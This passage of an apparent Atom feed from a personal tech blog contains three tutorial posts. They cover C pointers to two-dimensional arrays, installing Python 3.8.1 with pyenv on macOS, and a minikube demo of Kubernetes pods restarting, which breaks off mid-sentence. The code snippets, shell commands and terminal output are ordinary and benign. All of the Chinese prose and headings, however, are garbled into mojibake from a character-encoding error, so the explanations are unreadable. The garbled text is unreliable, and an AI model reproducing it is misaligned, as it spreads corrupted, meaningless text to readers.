å‹æ…‹ã€‚</p><p>ç‚ºä½•ä¸ç›´æ¥å¯«ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *td_ptr[<span class="number">2</span>]; <span class="comment">// å¯ä»¥çœ‹æˆ int *(td_ptr[2]);</span></span><br></pre></td></tr></tbody></table></figure><p>åŸå› æ˜¯å› ç‚ºå„ªå…ˆæ¬Šå¸¶ä¾†çš„å½±éŸ¿ä¸¦ä¸åŒï¼ˆ<code>[]</code> çš„å„ªå…ˆæ¬Šè¼ƒå¤§ï¼‰ï¼Œä»¥ä¸Šå®£å‘Šçš„æ„æ€æ˜¯ç”¢ç”Ÿä¸€å€‹å¤§å°ç‚º 2 çš„é™£åˆ—ï¼Œé™£åˆ—å…§å®¹æ˜¯å…©å€‹æŒ‡å‘ <code>int</code> çš„æŒ‡æ¨™ã€‚å¦‚ä¸‹ï¼š</p><p><code>{ptr1, ptr2}</code></p><p>å®£å‘Šå®ŒæŒ‡æ¨™ä¹‹å¾Œï¼Œæˆ‘å€‘å¯ä»¥å°‡è©²æŒ‡æ¨™ï¼ŒæŒ‡å‘æˆ‘å€‘çš„äºŒç¶­é™£åˆ—ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> td_arr[][<span class="number">2</span>] = {{<span class="number">1</span>, <span class="number">2</span>}, {<span class="number">3</span>, <span class="number">4</span>}, {<span class="number">5</span>, <span class="number">6</span>}};</span><br><span class="line"><span class="keyword">int</span> (*td_ptr)[<span class="number">2</span>];</span><br><span class="line">td_ptr = td_arr;</span><br></pre></td></tr></tbody></table></figure><p>æ¥è‘—ä¸€æ¨£å¯ä»¥ç”¨æŒ‡æ¨™ä¾†æ“ä½œè©²é™£åˆ—ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, td_ptr[<span class="number">2</span>][<span class="number">0</span>]); <span class="comment">//5</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, td_ptr[<span class="number">2</span>][<span class="number">1</span>]); <span class="comment">//6</span></span><br></pre></td></tr></tbody></table></figure><p>å¦‚æœéœ€è¦è¨­å®šå‡½æ•¸åŸå‹çš„è©±ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> (*ar)[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>æˆ–æ˜¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>çš†å¯ä»¥ç”¨ä¾†æ¥æ”¶ã€‚</p><p>æˆ‘æƒ³çœ‹åˆ°é€™é‚Šï¼Œå¦‚æœä½ æ²’æœ‰å…¶ä»–ç–‘å•çš„è©±ã€‚æ‡‰è©²å¯ä»¥ç¨å¾®ç†è§£ç‚ºä½•æˆ‘å€‘åœ¨å‚³éäºŒç¶­é™£åˆ—æ™‚ï¼Œæœƒä½¿ç”¨é€™æ¨£å­çš„å¯«æ³•äº†ï¼é€™æ¨£å­ç†è§£çš„è©±ä¹Ÿå¯ä»¥æ¨å»£åˆ°å¤šç¶­é™£åˆ—ä¸­ï¼Œåƒæ˜¯ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>][<span class="number">6</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> (*arr)[<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>][<span class="number">6</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h2><p>å¸Œæœ›é€™ç¯‡æ–‡ç« å¯ä»¥è®“å¤§å®¶æ›´åŠ ç†è§£ C èªè¨€é™£åˆ—èˆ‡æŒ‡æ¨™æ’°å¯«éç¨‹ä¸­çš„èƒŒæ™¯åŸå› ï¼Œåœ¨ç¶²è·¯ä¸Šçœ‹åˆ°å¤ªå¤šæ–‡ç« åªæœ‰æåˆ°å®£å‘Šæˆ–æ˜¯ä½¿ç”¨çš„æ–¹å¼ï¼Œä½†æ˜¯å»æ²’æœ‰åŠ ä»¥æè¿°ä»»ä½•åŸå› ï¼Œå°è‡´å¾ˆå¤šäººåªçŸ¥é“å¯«æ³•ä½†ä¸æ¸…æ¥šç‚ºä½•æ‡‰è©²é€™æ¨£å­æ’°å¯«ã€‚</p><p>å¸Œæœ›å¤§å®¶çœ‹å®Œæ–‡ç« æœ‰æ‰€æ”¶ç©« ğŸ˜„ï¼</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="c" scheme="https://blog.yiyu0x.org/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>å„ªé›…çš„åœ¨ macOS ä¸Šä½¿ç”¨ Python</title>
    <link href="https://blog.yiyu0x.org/2020/01/11/"/>
    <id>https://blog.yiyu0x.org/2020/01/11/</id>
    <published>2020-01-11T05:38:24.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="ç‚ºä»€è¦è¦é€™æ¨£åšï¼Ÿ"><a href="#ç‚ºä»€è¦è¦é€™æ¨£åšï¼Ÿ" class="headerlink" title="ç‚ºä»€è¦è¦é€™æ¨£åšï¼Ÿ"></a>ç‚ºä»€è¦è¦é€™æ¨£åšï¼Ÿ</h2><p>æˆ‘å€‘éƒ½çŸ¥é“ macOS æœ‰ Pythonï¼Œç‚ºäº†ä¸å°‡é è¨­çš„ç’°å¢ƒå¼„é«’ã€‚æ¯”è¼ƒæ¨è–¦çš„åšæ³•æ˜¯é€é <code>pyenv</code> é€™å¥— Python ç‰ˆæœ¬ç®¡ç†å·¥å…·ä¾†å®‰è£ä¸åŒçš„ Python ç‰ˆæœ¬ï¼Œå¦‚æ­¤ä¸€ä¾†è¦åˆ‡æ›ä¸åŒçš„ç‰ˆæœ¬ä¹Ÿæ–¹ä¾¿ï¼Œç•¢ç«Ÿé‚„æ˜¯æœ‰å¾ˆå¤šå°ˆæ¡ˆæ˜¯ç”¨ Python2 åœ¨ç¶­è­·ã€‚</p><p>å¦‚æœä½ æ²’æœ‰ä½¿ç”¨ä¸åŒçš„ Python ç‰ˆæœ¬éœ€æ±‚ä¹Ÿå¯ä»¥ç„¡è¦–é€™ç¯‡ï¼Œä½†æ˜¯å»ºè­°è‡³å°‘ç”¨ <code>virtualenv</code> ä¾†é–‹ç™¼å°ˆæ¡ˆï¼Œæ‰ä¸æœƒæŠŠå…§å»ºçš„ Python ç’°å¢ƒå¼„æˆä¸€åœ˜äº‚ã€‚</p><h2 id="æª¢æŸ¥ç›®å‰ç‰ˆæœ¬"><a href="#æª¢æŸ¥ç›®å‰ç‰ˆæœ¬" class="headerlink" title="æª¢æŸ¥ç›®å‰ç‰ˆæœ¬"></a>æª¢æŸ¥ç›®å‰ç‰ˆæœ¬</h2><p>ç›®å‰æˆ‘çš„ macOS çš„ Python æ˜¯é è¨­çš„ Pythonï¼š</p><p><code>which python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python</span><br></pre></td></tr></tbody></table></figure><p><code>python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Python 2.7 is not recommended.</span><br><span class="line">This version is included in macOS for compatibility with legacy software.</span><br><span class="line">Future versions of macOS will not include Python 2.7.</span><br><span class="line">Instead, it is recommended that you transition to using 'python3' from within Terminal.</span><br><span class="line"></span><br><span class="line">Python 2.7.16 (default, Nov  9 2019, 05:55:08)</span><br><span class="line">[GCC 4.2.1 Compatible Apple LLVM 11.0.0 (clang-1100.0.32.4) (-macos10.15-objc-s on darwin</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line">>>></span><br></pre></td></tr></tbody></table></figure><h2 id="ç”¨-pyenv-ä¾†ç®¡ç†-Python-ç‰ˆæœ¬"><a href="#ç”¨-pyenv-ä¾†ç®¡ç†-Python-ç‰ˆæœ¬" class="headerlink" title="ç”¨ pyenv ä¾†ç®¡ç† Python ç‰ˆæœ¬"></a>ç”¨ pyenv ä¾†ç®¡ç† Python ç‰ˆæœ¬</h2><p>é¦–å…ˆï¼Œå…ˆå®‰è£ pyenvï¼š</p><p><code>brew install pyenv</code></p><p>å®‰è£å®Œç•¢å¾Œç¢ºèªè‡ªå·±çš„ç’°å¢ƒè®Šæ•¸ï¼š</p><p><code>echo $PATH</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</span><br></pre></td></tr></tbody></table></figure><h3 id="åˆå§‹è¨­å®šè¨­å®š"><a href="#åˆå§‹è¨­å®šè¨­å®š" class="headerlink" title="åˆå§‹è¨­å®šè¨­å®š"></a>åˆå§‹è¨­å®šè¨­å®š</h3><p><code>~/.zshrc</code> è«‹è‡ªè¡Œæ›¿æ›æˆä½ çš„ shell çš„è¨­å®šæª”ä½ç½®ï¼ˆbash çš„è©±æ˜¯ <code>~/.bash_profile</code>ï¼‰ï¼š</p><p><code>echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.zshrc</code></p><p>é‡æ–°è¼‰å…¥ shellï¼š</p><p><code>source ~/.zshrc</code></p><p>é‡æ–°ç¢ºèªç’°å¢ƒè®Šæ•¸ï¼š</p><p><code>echo $PATH</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/yiyuchang/.pyenv/shims:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥ç™¼ç¾å®¶ç›®éŒ„ä¸‹å¤šäº†ä¸€å€‹ <code>.pyenv/shims</code> ç®¡ç†é€™äº›å¥—ä»¶ï¼Œé€™ä¹Ÿæ˜¯ <code>pyenv</code> é€²è¡Œç¥ç§˜é­”æ³•çš„åœ°æ–¹ ğŸ§™â€â™‚ï¸</p><h2 id="é–‹å§‹ä½¿ç”¨-pyenv"><a href="#é–‹å§‹ä½¿ç”¨-pyenv" class="headerlink" title="é–‹å§‹ä½¿ç”¨ pyenv"></a>é–‹å§‹ä½¿ç”¨ pyenv</h2><p>ç¢ºèªç›®å‰ Python ç‰ˆæœ¬ç‚ºç³»çµ±ç‰ˆæœ¬ï¼š</p><p><code>pyenv global</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system</span><br></pre></td></tr></tbody></table></figure><p>é¡¯ç¤ºå¯å–ç”¨çš„ Python ç‰ˆæœ¬<br><code>pyenv install --list</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Available versions:</span><br><span class="line">  2.1.3</span><br><span class="line">  2.2.3</span><br><span class="line">  2.3.7</span><br><span class="line">  2.4.0</span><br><span class="line">  2.4.1</span><br><span class="line">  (ç•¥)</span><br><span class="line">  stackless-3.4-dev</span><br><span class="line">  stackless-3.4.1</span><br><span class="line">  stackless-3.4.2</span><br><span class="line">  stackless-3.4.7</span><br><span class="line">  stackless-3.5.4</span><br></pre></td></tr></tbody></table></figure><p>è£¡é¢æœ‰å„å¼å„æ¨£çš„ Python interpreterï¼Œåœ¨é€™é‚Šï¼Œæˆ‘æƒ³ä½¿ç”¨å®˜æ–¹çš„ 3.8.1 ç‰ˆæœ¬ï¼Œå…ˆé€²è¡Œå®‰è£ï¼š</p><p><code>pyenv install 3.8.1</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python-build: use openssl@1.1 from homebrew</span><br><span class="line">python-build: use readline from homebrew</span><br><span class="line">Downloading Python-3.8.1.tar.xz...</span><br><span class="line">-> https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz</span><br><span class="line">Installing Python-3.8.1...</span><br><span class="line">python-build: use readline from homebrew</span><br><span class="line">python-build: use zlib from xcode sdk</span><br><span class="line">Installed Python-3.8.1 to /Users/yiyuchang/.pyenv/versions/3.8.1</span><br></pre></td></tr></tbody></table></figure><p>æŸ¥çœ‹ç›®å‰æœ¬åœ°ç«¯æ‰€æœ‰çš„ Python ç‰ˆæœ¬ï¼ˆæœ‰æ˜Ÿè™Ÿä»£è¡¨ç›®å‰æ­£åœ¨ä½¿ç”¨ï¼‰ï¼š</p><p><code>pyenv versions</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* system (set by /Users/yiyuchang/.pyenv/version)</span><br><span class="line">  3.8.1</span><br></pre></td></tr></tbody></table></figure><p>å°‡ Python åˆ‡æ›åˆ°å‰›æ‰ä¸‹è¼‰çš„ 3.8.1ï¼š</p><p><code>pyenv global 3.8.1</code><br><code>pyenv versions</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  system</span><br><span class="line">* 3.8.1 (set by /Users/yiyuchang/.pyenv/version)</span><br></pre></td></tr></tbody></table></figure><p>åˆ‡æ›ä¸ä¸€å®šè¦ä½¿ç”¨ <code>global</code>, <code>global</code> ä»£è¡¨å…¨åŸŸçš„ Python ç‰ˆæœ¬ï¼Œå¦å¤–å…©ç¨®æ–¹å¼<code>local</code> æˆ–æ˜¯ <code>shell</code> æœ‰èˆˆè¶£çš„æœ‹å‹å¯ä»¥å»äº†è§£ä¸€ä¸‹ï¼Œå¯ä»¥æ›´å½ˆæ€§çš„é€²è¡Œ Python ç‰ˆæœ¬ç®¡ç†</p><p>æ¥è‘—ç¢ºèª Python æ˜¯ä¸æ˜¯çœŸçš„åˆ‡æ›åˆ°æˆ‘å€‘å‰›æ‰ä¸‹è¼‰çš„ <code>3.8.1</code> äº†ï¼š</p><p><code>which python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/yiyuchang/.pyenv/shims/python</span><br></pre></td></tr></tbody></table></figure><p><code>python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python 3.8.1 (default, Jan 11 2020, 12:25:19)</span><br><span class="line">[Clang 11.0.0 (clang-1100.0.33.16)] on darwin</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line">>>></span><br></pre></td></tr></tbody></table></figure><p>å¤§åŠŸå‘Šæˆï¼å¦‚æ­¤ä¸€ä¾†ä¹‹å¾Œå°±å¯ä»¥è¼•é¬†åœ°åœ¨ä¸åŒå°ˆæ¡ˆä¸‹ä½¿ç”¨ Python äº†ã€‚ä¸éå»ºè­°åœ¨ä¸åŒå°ˆæ¡ˆé‚„æ˜¯è¦ä½¿ç”¨ <code>virtualenv</code> ä¾†ç®¡ç†ï¼Œå¦å‰‡å¥—ä»¶å…¨éƒ¨æœƒè£åœ¨æœ¬æ©Ÿçš„å…¨åŸŸçš„ Python ç’°å¢ƒä¸Šï¼Œå¦‚æœä¸åŒå°ˆæ¡ˆè¦ç”¨åˆ°ä¸åŒç‰ˆæœ¬çš„å¥—ä»¶ï¼Œåˆæœƒè®Šå¾—ä¸€åœ˜ç³Ÿï¼</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://blog.yiyu0x.org/tags/python/"/>
    
      <category term="macos" scheme="https://blog.yiyu0x.org/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>å¿«é€Ÿé«”é©— kubernetes çš„å¼·å¤§ä¹‹è™•</title>
    <link href="https://blog.yiyu0x.org/2020/01/08/"/>
    <id>https://blog.yiyu0x.org/2020/01/08/</id>
    <published>2020-01-08T05:17:53.000Z</published>
    <updated>2025-04-12T20:59:43.594Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å®¹å™¨æŠ€è¡“è¿‘å¹´ä¾†éå¸¸æµè¡Œï¼Œç›¸ä¿¡å„ä½åœ¨ä¸åŒåœ°æ–¹å¤šå°‘æœ‰è½é <code>kubernetes</code>ï¼ˆæˆ–æ˜¯å®ƒçš„ç°¡ç¨± <code>k8s</code>ï¼‰é€™é …æŠ€è¡“ã€‚ä½†æ˜¯å¾ˆå¤šäººäº†è§£ <code>k8s</code> ä¹‹å¾Œæœƒè¢«é€™å€‹æŠ€è¡“åš‡åˆ°ï¼ŒåŸå› æ˜¯å› ç‚ºæœ‰å¤§é‡çš„åè©ï¼Œåƒæ˜¯ <code>Pod</code>, <code>Service</code> ç­‰ç­‰ï¼ˆé€™äº›å…ƒä»¶æ•¸é‡é«˜é” 60 å¤šç¨®ï¼‰ï¼Œç„¶å¾Œåˆæœ‰ä¸€å¤§å †çš„æ¶æ§‹åœ–ï¼Œå¾ˆå¤šäººå¯èƒ½é‚„æ²’é–‹å§‹å°±å…ˆæ”¾æ£„äº†ã€‚</p><p>é€™ç¯‡æ–‡ç« çš„ç›®çš„æ²’æœ‰è¦æ•™å¤§å®¶äº†è§£ <code>k8s</code> èƒŒå¾Œçš„è§€å¿µï¼Œè€Œæ˜¯è¦é€éç°¡å–®çš„å°å¯¦é©—ä¾†è®“å¤§å®¶äº†è§£ <code>k8s</code> çš„ä½œç”¨åˆ°åº•ç‚ºä½•ï¼Ÿè®“å¤§å®¶æœ‰é»æ„Ÿè¦ºï¼Œå¾ŒçºŒå¦‚æœå„ä½è¦æ·±å…¥äº†è§£ï¼Œå¯èƒ½ä¹Ÿæœƒæœ‰é»å¹«åŠ©ã€‚</p><p>ç°¡å–®ä¾†èªª <code>k8s</code> æ˜¯ä¸€é …å¯ä»¥ç®¡ç†å®¹å™¨çš„æŠ€è¡“ï¼Œè€Œä¸”å¯ä»¥åˆ†æ•£å¼çš„ç®¡ç†ã€‚æ„æ€å°±æ˜¯å®¹å™¨æ›æ‰ä¹‹å¾Œ <code>k8s</code> æœƒè‡ªå‹•åµæ¸¬ä¸¦ä¸”è®“å®¹å™¨é‡æ–°å•Ÿå‹•ã€‚ç•¶ç„¶é‚„æœ‰éå¸¸å¤šçš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸»è¦çš„æ ¸å¿ƒç›®çš„å°±æ˜¯ä¿æŒæ‡‰ç”¨ç¨‹å¼çš„ <code>é«˜å¯ç”¨æ€§ï¼ˆhigh availabilityï¼‰</code>ï¼ˆç°¡ç¨± HAï¼‰ã€‚</p><p>æœ¬ç¯‡å¯¦é©—æœƒé€éä¸€å€‹ç°¡å–®ä¾‹å­ä¾†è®“å¤§å®¶çœ‹åˆ° <code>k8s</code> é”æˆé«˜å¯ç”¨æ€§çš„æˆæ•ˆã€‚</p><h2 id="å¯¦é©—å¿…å‚™"><a href="#å¯¦é©—å¿…å‚™" class="headerlink" title="å¯¦é©—å¿…å‚™"></a>å¯¦é©—å¿…å‚™</h2><ul><li>docker</li><li>minikube</li></ul><h2 id="ä¸€èˆ¬å®¹å™¨"><a href="#ä¸€èˆ¬å®¹å™¨" class="headerlink" title="ä¸€èˆ¬å®¹å™¨"></a>ä¸€èˆ¬å®¹å™¨</h2><p>åœ¨é–‹å§‹ä¹‹å‰ï¼Œå¤§å®¶å¯ä»¥å…ˆè·‘é€™å€‹å®¹å™¨ï¼ˆyiyu0x/current-timeï¼‰èµ·ä¾†ç©ç©çœ‹</p><p><code>docker run -d -p 3000:3000 yiyu0x/current-time</code></p><p>é€™å€‹å®¹å™¨æœƒåœ¨ localhost 3000 port é–‹ä¸€å€‹é¡¯ç¤ºç›®å‰æ™‚é–“çš„ APIï¼š</p><p>å¦‚æœé †åˆ©çš„è©±è¨ªå• <code>localhost:3000</code> æœƒå¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Current time is 4:2:48</span><br></pre></td></tr></tbody></table></figure><p>æˆ‘å€‘å¯ä»¥å¾Œé <code>docker ps</code> ä¾†ç¢ºèªé€™å€‹ container æ­£ç¢ºç„¡èª¤çš„é‹ä½œï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api â¯ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">d5662a916aed        yiyu0x/current-time   "docker-entrypoint.sâ€¦"   10 seconds ago      Up 8 seconds        0.0.0.0:3000->3000/tcp   tender_hypatia</span><br></pre></td></tr></tbody></table></figure><p>ä½†æ˜¯æˆ‘å€‘å¦‚æœå»æˆ³ <code>localhost:3000/bye</code> é€™å€‹ä½ç½®çš„è©±ï¼Œæœƒç™¼ç¾å®¹å™¨æ›æ‰äº†ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api â¯ docker ps</span><br></pre></td></tr></tbody></table></figure><p>é€™å€‹è¡Œç‚ºæ¨¡æ“¬å‡ºç•¶æ‡‰ç”¨ç¨‹å¼æ„å¤–çµæŸçš„æƒ…æ³ã€‚</p><h2 id="å°å…¥-k8s"><a href="#å°å…¥-k8s" class="headerlink" title="å°å…¥ k8s"></a>å°å…¥ k8s</h2><p>å»ºç«‹ä¸€å€‹ <code>pod</code> å…§å®¹æ˜¯å‰›æ‰çš„ <code>current-time</code> çš„ <code>container</code>ï¼š<br><code>kubectl run --image=yiyu0x/current-time curr-time --generator=run-pod/v1</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api â¯ kubectl get po</span><br><span class="line">NAME        READY   STATUS              RESTARTS   AGE</span><br><span class="line">curr-time   0/1     ContainerCreating   0          16s</span><br></pre></td></tr></tbody></table></figure><p>å°‡ä»– <code>expose</code> å‡ºå»ï¼š</p><p><code>kubectl expose pod curr-time --port 3000 --type=NodePort</code></p><p>å–å¾—ä½ç½®ä¸¦ä¸”è¨ªå•ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api â¯ minikube service curr-time --url</span><br><span class="line">http://192.168.64.6:30948</span><br></pre></td></tr></tbody></table></figure><p>æ­¤æ™‚å»ºè­°å†é–‹ä¸€å€‹ terminal çš„ tab ä½¿ç”¨:<br><code>watch kubectl get po</code><br>ï¼ˆæ„Ÿè¬å­¸é•· Jerry Wang æŒ‡æ­£ï¼Œå¯ä»¥ç”¨ <code>kubectl get po -w</code> å°±ä¸ç”¨é¡å¤–å®‰è£ watch æŒ‡ä»¤äº†ï¼ï¼‰</p><p>ç›£æ¸¬è©² <code>pod</code> çš„ç‹€æ…‹ä¸¦ä¸”å»æˆ³ <code>http://192.168.64.6:30948/bye</code></p><p>ä½ æœƒç™¼ç¾å®¹å™¨æ›æ‰å¾Œå¹¾ç§’é˜ï¼Œåˆè‡ªå·±é‡æ–°è·‘èµ·ä¾†äº†ï¼Œä¸¦ä¸” RESTARTS çš„æ•¸é‡è®Šæˆ 1 äº†ï¼ˆåŸæœ¬æ˜¯ 0ï¼‰ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME        READY   STATUS    RESTARTS   AGE</span><br><span class="line">curr-time   1/1     Running   1          8m56s</span><br></pre></td></tr></tbody></table></figure><h2 id="æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§-replicas"><a href="#æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§-replicas" class="headerlink" title="æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§ - replicas"></a>æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§ - replicas</h2><p>é€éä»¥ä¸Šä¾‹å­å·²ç¶“å¯ä»¥æ„Ÿè¦ºåˆ° <code>k8s</code> çš„å¨åŠ›ï¼Œä½†æ˜¯å…¶å¯¦ <code>docker</code> æœ¬èº«å°±å¯ä»¥ç›£æ¸¬å®¹å™¨çš„ç‹€æ…‹ä¸¦ä¸”é‡æ–°å•Ÿå‹•äº†ã€‚<code>k8s</code> æ›´å¼·å¤§çš„åœ°æ–¹åœ¨æ–¼å®ƒå¯ä»¥ä¸€æ¬¡å»ºç«‹å¤šå€‹ <code>pod</code> ä¸¦ä¸”åœ¨ä¸€å€‹ <code>pod</code> æ›æ‰æ™‚é€é <code>loadbalancer</code> é¦¬ä¸ŠæŠŠæµé‡åˆ‡æ›åˆ°å…¶ä»– <code>pod</code> ä¸­ï¼Œé€™æ¨£å­ä½¿ç”¨è€…å®Œå…¨æ„Ÿè¦ºä¸å‡ºä¾†åŸä¾†æœå‹™æœ‰æ›æ‰éã€‚</p><p>å»ºç«‹ <code>replicas</code>ï¼š<br><code>kubectl run curr-time --image=yiyu0x/current-time --replicas=3 --port 3000</code></p><p>å°å¤–æ‰“é–‹ï¼š<br><code>kubectl expose deployment curr-time --port=3000 --type=NodePort</code></p><p>ä¸€æ¨£é€é <code>watch kubectl get po</code> ä¾†ç›£æ§ <code>pod</code>ï¼š</p><p>ï¼ˆ2019/1/17 æ›´æ–°ï¼šæˆ–æ˜¯ç”¨ <code>kubectl get po -w</code>ï¼‰</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Every 2.0s: kubectl get po</span><br><span class="line"></span><br><span class="line">NAME                         READY   STATUS    RESTARTS   AGE</span><br><span class="line">curr-time-6f9cb4fdf9-crc66   1/1     Running   3          7m41s</span><br><span class="line">curr-time-6f9cb4fdf9-hbkx5   1/1     Running   2          7m41s</span><br><span class="line">curr-time-6f9cb4fdf9-s742x   1/1     Running   2          7m41s</span><br></pre></td></tr></tbody></table></figure><p>ç„¶å¾Œæˆ³ä¸€ä¸‹ API çš„ bye ä½ç½®ï¼Œæœƒç™¼ç¾ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Every 2.0s: kubectl get po</span><br><span class="line"></span><br><span class="line">NAME                         READY   STATUS      RESTARTS   AGE</span><br><span class="line">curr-time-6f9cb4fdf9-crc66   0/1     Completed   3          8m40s</span><br><span class="line">curr-time-6f9cb4fdf9-hbkx5   1/1     Running     2          8m40s</span><br><span class="line">curr-time-6f9cb4fdf9-s742x   1/1     Running     2          8m40s</span><br></pre></td></tr></tbody></table></figure><p>ä¸‰å€‹æœå‹™ä¸­çš„å®¹å™¨ä¸€å€‹æ›æ‰å…¶ä»–å…©å€‹é‚„æ˜¯æ­£å¸¸é‹ä½œä¸­ï¼Œä½¿ç”¨è€…æ ¹æœ¬æ„Ÿè¦ºä¸å‡ºä¾†ï¼ˆæµé‡æœƒè¢«å°å…¥åˆ°æ­£å¸¸é‹ä½œçš„ pod 